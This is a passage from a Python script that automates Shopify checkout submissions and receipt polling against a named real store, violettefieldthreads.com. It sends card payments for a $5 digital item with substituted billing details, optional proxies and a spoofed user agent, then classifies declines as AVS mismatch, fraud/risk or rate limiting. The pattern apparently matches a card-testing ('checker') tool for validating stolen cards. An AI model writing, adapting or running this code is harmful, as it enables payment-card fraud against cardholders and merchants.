paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment RemoteDetails on Remote{consolidated{taxes{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxesIncludedAmountInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}termsStatus __typename}totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}delivery{deliveryMacros{id title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTitle __typename}isShippingRequired termsStatus __typename}__typename}remoteNegotiations{shopId sessionToken errors{...ViolationDetails __typename}result{...on RemoteNegotiationResultAvailable{sellerProposal{...RemoteSellerProposalFragment __typename}buyerProposal{...RemoteBuyerProposalFragment __typename}__typename}...on RemoteNegotiationResultUnavailable{reason __typename}__typename}__typename}__typename}fragment ViolationDetails on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}fragment RemoteSellerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment RemoteBuyerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}__typename}',
        'variables': {
            'input': {
                'sessionInput': {
                    'sessionToken': x,
                },
                'queueToken': queue_token,
                'discounts': {
                    'lines': [],
                    'acceptUnexpectedDiscounts': True,
                },
                'delivery': {
                    'deliveryLines': [
                        {
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {
                                        'any': True,
                                    },
                                    'shipments': {
                                        'any': True,
                                    },
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {
                                'lines': [
                                    {
                                        'stableId': stableid,
                                    },
                                ],
                            },
                            'deliveryMethodTypes': [
                                'NONE',  # For digital product, no shipping
                            ],
                            'expectedTotalPrice': {
                                'any': True,
                            },
                            'destinationChanged': True,
                        },
                    ],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                },
                'deliveryExpectations': {
                    'deliveryExpectationLines': [],
                },
                'merchandise': {
                    'merchandiseLines': [
                        {
                            'stableId': stableid,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': 'gid://shopify/ProductVariantMerchandise/41957285840',
                                    'variantId': 'gid://shopify/ProductVariant/41957285840',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                },
                            },
                            'quantity': {
                                'items': {
                                    'value': 1,
                                },
                            },
                            'expectedTotalPrice': {
                                'value': {
                                    'amount': '5.00',
                                    'currencyCode': 'USD',
                                },
                            },
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        },
                    ],
                },
                'memberships': {
                    'memberships': [],
                },
                'payment': {
                    'totalAmount': {
                        'any': True,
                    },
                    'paymentLines': [
                        {
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': paymentmethodidentifier,
                                    'sessionId': sid,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': addr1,
                                            'address2': addr2,
                                            'city': city,
                                            'countryCode': country_code,
                                            'postalCode': postal,
                                            'lastName': addr_last,
                                            'firstName': rfirst,
                                            'zoneCode': zone,
                                            'phone': '',
                                        },
                                    },
                                    'cardSource': None,
                                },
                                'giftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None,
                            },
                            'amount': {
                                'value': {
                                    'amount': '5',
                                    'currencyCode': 'USD',
                                },
                            },
                        },
                    ],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': addr1,
                            'address2': addr2,
                            'city': city,
                            'countryCode': country_code,
                            'postalCode': postal,
                            'lastName': rlast,
                            'firstName': rfirst,
                            'zoneCode': zone,
                            'phone': '',
                        },
                    },
                },
                'buyerIdentity': {
                    'customer': {
                        'presentmentCurrency': 'USD',
                        'countryCode': 'US',
                    },
                    'email': remail,
                    'emailChanged': False,
                    'phoneCountryCode': 'US',
                    'marketingConsent': [
                        {
                            'email': {
                                'value': remail,
                            },
                        },
                    ],
                    'shopPayOptInPhone': {
                        'countryCode': 'US',
                    },
                    'rememberMe': False,
                },
                'tip': {
                    'tipLines': [],
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {
                        'value': {
                            'amount': '0',
                            'currencyCode': 'USD',
                        },
                    },
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': [],
                },
                'note': {
                    'message': None,
                    'customAttributes': [
                        {
                            'key': '_source',
                            'value': 'Rebuy',
                        },
                        {
                            'key': '_attribution',
                            'value': 'Smart Cart 2.0',
                        },
                    ],
                },
                'localizationExtension': {
                    'fields': [],
                },
                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': [],
                },
                'optionalDuties': {
                    'buyerRefusesDuties': False,
                },
                'cartMetafields': [],
            },
            'attemptToken': f'{tok}',
            'metafields': [],
            'analytics': {
                'requestUrl': f'https://violettefieldthreads.com/checkouts/cn/{tok}/en-us?auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            },
        },
        'operationName': 'SubmitForCompletion',
    }

    response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql',
        params=params,
        headers=headers,
        json=json_data,
        proxies=proxy if proxy else None
    )
    #------------×Submitt_For_Checkout×-----------#
    
    
    #-----------×Response_For_Debug×-------------#
    raw = response.text
    print(f"Submit Response: {raw[:500]}...")  # Debug log
    try:
        res_json = json.loads(raw)
        submit_data = res_json['data']['submitForCompletion']
        if 'receipt' in submit_data or submit_data.get('__typename') in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            rid = submit_data['receipt']['id'] if 'receipt' in submit_data else submit_data.get('receipt', {}).get('id')
            print(f"Receipt ID: {rid}")
        elif 'buyerProposal' in submit_data or submit_data.get('__typename') == 'SubmitRejected':
            print("Submit returned buyerProposal - rejected.")
            errors = submit_data.get('errors', [])
            if errors:
                for e in errors:
                    code = e.get('code', 'Unknown')
                    msg = e.get('localizedMessage', 'No message')
                    print(f"Error Code: {code}, Message: {msg}")
                    if 'avs' in code.lower() or 'address' in msg.lower():
                        return "Declined: AVS/Address Mismatch"
                    elif 'fraud' in code.lower() or 'risk' in code.lower():
                        return "Declined: Fraud/Risk Detected"
                    elif 'price' in msg.lower() or 'total' in msg.lower():
                        return "Declined: Price Mismatch"
                    else:
                        return f"Declined: {code} - {msg}"
            else:
                return "Declined: Rejected (negotiation required or fraud detected)"
        else:
            # Check for other cases like Throttled
            if 'Throttled' in str(submit_data):
                return "Throttled: Rate limited"
            errors = res_json.get('errors', [])
            if errors:
                return f"GraphQL Error: {errors[0].get('message', 'Unknown')}"
            return "Failed at step 5: Unexpected response structure."
            
    except (json.JSONDecodeError, KeyError, TypeError) as e:
        print(f"Parse error: {e}")
        print(f"Raw response: {raw[:300]}")
        return f"Failed at step 5: Could not parse response. Error: {e}"
    #-----------×Response_For_Debug×-------------#
    random_delay(0.2, 0.5)

    
    #------------×Polling_receipt×-------------#
    print("Step 6: Polling for receipt...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'PollForReceipt',
    }
    json_data = {
        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}finalizedRemoteCheckouts{...FinalizedRemoteCheckoutsResult __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value 